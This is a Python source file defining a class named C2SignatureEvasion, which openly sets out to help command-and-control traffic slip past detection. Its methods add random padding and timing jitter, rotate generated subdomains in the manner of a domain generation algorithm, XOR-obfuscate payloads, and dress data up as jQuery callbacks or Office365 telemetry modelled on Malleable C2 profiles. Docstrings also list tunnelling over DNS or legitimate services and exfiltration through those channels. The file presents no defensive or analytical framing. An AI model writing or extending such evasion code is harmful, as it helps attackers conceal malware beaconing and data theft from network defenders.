
import random
import time
import hashlib
import string
from datetime import datetime
from typing import List, Dict, Tuple, Optional


class C2SignatureEvasion:
    """
    Evade C2 detection:
    - Variable request sizes
    - Random delays
    - Domain rotation
    - Mixed transports
    - Protocol obfuscation
    """

    def __init__(self, base_domains: Optional[List[str]] = None):
        self.base_domains = base_domains or ["example.com", "test.org", "demo.net"]
        self.current_domain_index = 0
        self.last_rotation = datetime.now()
        self.rotation_interval_hours = 24

    def randomize_traffic(self, data: bytes) -> Tuple[bytes, Dict[str, any]]:
        """
        Vary packet sizes
        Randomize timing
        Add jitter
        Mix with legitimate traffic
        """
        random_padding = random.randbytes(random.randint(0, 256))
        randomized_data = data + random_padding
        
        jitter_ms = random.randint(100, 5000)
        
        return randomized_data, {
            "padding_size": len(random_padding),
            "jitter_ms": jitter_ms,
            "original_size": len(data),
            "total_size": len(randomized_data)
        }

    def domain_rotation(self, seed: Optional[str] = None) -> str:
        """
        Generate domains algorithmically
        Use CDN
        Use DGA (Domain Generation Algorithm)
        Rotate daily/hourly
        """
        now = datetime.now()
        hours_since_rotation = (now - self.last_rotation).total_seconds() / 3600
        
        if hours_since_rotation >= self.rotation_interval_hours:
            self.current_domain_index = (self.current_domain_index + 1) % len(self.base_domains)
            self.last_rotation = now
        
        base_domain = self.base_domains[self.current_domain_index]
        
        if seed is None:
            seed = datetime.now().strftime("%Y%m%d%H")
        
        hash_val = hashlib.sha256(seed.encode()).hexdigest()[:16]
        subdomain = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(random.randint(8, 16)))
        
        return f"{subdomain}.{base_domain}"

    def protocol_obfuscation(self, data: bytes) -> bytes:
        """
        Tunnel over HTTP/DNS/HTTPS
        Use legitimate services (Google, Microsoft, etc.)
        Steganography in images
        Exfiltrate via legitimate protocols
        """
        key = random.randint(1, 255)
        obfuscated = bytes([(b ^ key) for b in data])
        return bytes([key]) + obfuscated

    @staticmethod
    def blend_traffic(data: bytes, profile: str = "jquery") -> bytes:
        """
        Wrap data in a legitimate-looking container (JSON, JS, HTML).
        Blends with the selected Malleable C2 profile.
        """
        if profile == "jquery":
            return f"jQuery360012345({data.hex()});".encode()
        elif profile == "office365":
            return f'{{"telemetry":{{"id":"{random.randint(1000,9999)}","data":"{data.hex()}"}}}}'.encode()
        return data

    def calculate_jitter(self, base_sleep: int, jitter_percent: int = 30) -> int:
        """Calculate a randomized sleep interval based on jitter percentage."""
        delta = int(base_sleep * (jitter_percent / 100.0))
        return base_sleep + random.randint(-delta, delta)
